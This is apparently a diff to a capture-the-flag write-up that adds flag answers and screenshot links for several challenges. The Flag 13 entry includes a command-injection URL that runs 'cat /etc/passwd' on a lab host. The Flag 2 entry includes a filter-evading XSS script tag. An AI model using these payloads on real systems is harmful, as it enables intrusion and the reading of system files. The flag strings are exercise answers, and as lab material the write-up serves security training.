@@ -4,8 +4,12 @@
 
 ### Flag 13: 
 
+![image](https://github.com/user-attachments/assets/fbc16abf-d720-49ae-b820-9c02eb328abd)
+</br>
 ```shell
-dssd
+192.168.14.35/souvenirs.php?message=CALLUSNOW;system('cat /etc/passwd')
+
+jdka7sk23dd
 ```
 
 ## Advanced
@@ -30,14 +34,18 @@ jj
 
 ### Flag 12: 
 
+![image](https://github.com/user-attachments/assets/207457c0-ed4f-4ba1-b59c-608f5d0f7c22)
+</br>
 ```shell
-jj
+hsk23oncsd
 ```
 
 ### Flag 4: 
 
+![image](https://github.com/user-attachments/assets/617fb66a-eeb7-496b-a09f-9bf9ccb1ea69)
+</br>
 ```shell
-jj
+nckd97dk6sh2
 ```
 
 ### Flag 14: 
@@ -68,8 +76,12 @@ opshdkasy78s
 
 ### Flag 2: 
 
+![image](https://github.com/user-attachments/assets/9782ef65-3f2f-4a82-8712-d2fc3a291348)
+</br>
 ```shell
-dd
+<SCscriptRIPT>alert('flag2')</SCscriptRIPT>
+
+ksdnd99dkas
 ```
 
 ## Easy
@@ -131,6 +143,8 @@ dkkdudfkdy23
 
 ksdnd99dkas
 ```
+
+
 
 # Linux Servers
 
